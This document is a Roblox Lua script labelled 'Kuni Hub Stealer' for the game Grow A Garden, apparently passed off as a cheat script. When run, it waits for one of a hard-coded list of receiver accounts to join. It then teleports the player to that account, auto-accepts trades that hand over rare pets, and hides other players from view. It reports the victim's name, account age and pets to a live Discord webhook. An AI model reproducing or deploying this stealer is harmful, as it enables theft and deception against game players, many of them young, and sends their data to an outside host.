repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
local dataModule = require(ReplicatedStorage.Modules.DataService)

local USERNAMES = {
    "HelloWorld_Z99",
    "Kuni_Loot",
    "Kuni_Loot1",
    "Kuni_Loot02",
    "Kuni_Loot3",
    "Elaine_Pets",
    "Elaine_Pets1",
    "Elaine_Pets2",
    "Elaine_Pets3",
    "Elaine_Pets4",
    "Elaine_Pets5",
    "Elaine_Pets6",
    "Elaine_Pets7",
    "Elaine_Pets8",
    "Elaine_Pets9",
    "Elaine_Pets10",
    "Elaine_Pets11",
    "Elaine_Pets12",
    "Elaine_Pets13",
    "Elaine_Pets14",
    "Elaine_Pets15",
    "Elaine_Pets16",
    "Elaine_Pets17",
    "Elaine_Pets18",
    "Elaine_Pets19",
    "Elaine_Pets20",
    "BEESUYAH"
}
local PET_WHITELIST = {
    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
    ["Fennec Fox"] = "{some-uuid-fff-fff-fff}",
    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
    ["Butterfly"] = "{some-uuid-fff-fff-fff}",
    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
    ["Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}"
}

local function checkPetsWhitelist(petName)
    return PET_WHITELIST[petName] ~= nil
end

local function getPetObject(petUUID)
    for _, obj in pairs(LocalPlayer.Backpack:GetChildren()) do
        if obj:GetAttribute("PET_UUID") == petUUID then
            return obj
        end
    end
    if LocalPlayer.Character then
        for _, obj in pairs(LocalPlayer.Character:GetChildren()) do
            if obj:GetAttribute("PET_UUID") == petUUID then
                return obj
            end
        end
    end
    return nil
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
    end
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid:EquipTool(pet)
    end
end

local function autoAcceptTrade(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character then
        local head = targetPlayer.Character:FindFirstChild("Head")
        if head then
            local prompt = head:FindFirstChildWhichIsA("ProximityPrompt")
            if prompt then
                prompt.HoldDuration = 0
                prompt:InputHoldBegin()
                task.wait(0.1)
                prompt:InputHoldEnd()
                print("Trade accepted with", targetName)
            else
                warn("No trade prompt found for", targetName)
            end
        end
    end
end

local function teleportTarget(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
        task.wait(0.2) -- allow teleport to process
        autoAcceptTrade(targetName)
    end
end

local function startSteal(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
        local prompt = targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
        if prompt then
            prompt.HoldDuration = 0
            prompt:InputHoldBegin()
            task.wait(0.1)
            prompt:InputHoldEnd()
            -- deltaBypass here if needed
        end
    end
end

local function checkPetsInventory(targetName)
    for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if not checkPetsWhitelist(petData.PetType) then
            continue
        end
        local petObject = getPetObject(petUUID)
        if petObject then
            equipPet(petObject)
            task.wait(0.2)
            startSteal(targetName)
        end
    end
end

local function waitForWhitelistPlayer()
    while true do
        for _, player in pairs(Players:GetPlayers()) do
            if table.find(USERNAMES, player.Name) then
                return player.Name
            end
        end
        task.wait(1)
    end
end

local function makeInvisibleToOthers()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
                        part.Transparency = 1
                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
                        part.Enabled = false
                    end
                end
            end
        end
    end
end

local function createDiscordEmbed(petList, totalValue)
    local embed = {
        title = "üå± Grow A Garden Hit - Kuni Hub Stealer üí∞",
        color = 65280,
        fields = {
            {
                name = "üë§ Player Information",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                    LocalPlayer.Name,
                    table.concat(USERNAMES, " "),
                    LocalPlayer.Name,
                    LocalPlayer.AccountAge),
                inline = false
            },
           
            {
                name = "üéí Backpack",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "üèÅ Join with URL",
                value = string.format(
                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                    game.JobId,
                    game.PlaceId,
                    game.JobId),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format(
            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
            game.PlaceId,
            game.JobId
        ),
        username = LocalPlayer.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }

    local request = http_request or request or HttpPost or syn.request
    local response = request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })

    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
        warn("Error sending to Discord:", response.StatusCode, response.Body)
    end
end

-- Main loop
task.spawn(function()
    while true do
        local targetName = waitForWhitelistPlayer()
        if targetName then
            teleportTarget(targetName)
            checkPetsInventory(targetName)
            makeInvisibleToOthers()

            local petNames = {}
            for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
                if checkPetsWhitelist(petData.PetType) then
                    table.insert(petNames, petData.PetType)
                end
            end

            createDiscordEmbed(table.concat(petNames, "\n"), "100000")
            break
        end
        task.wait(0.5)
    end
end)
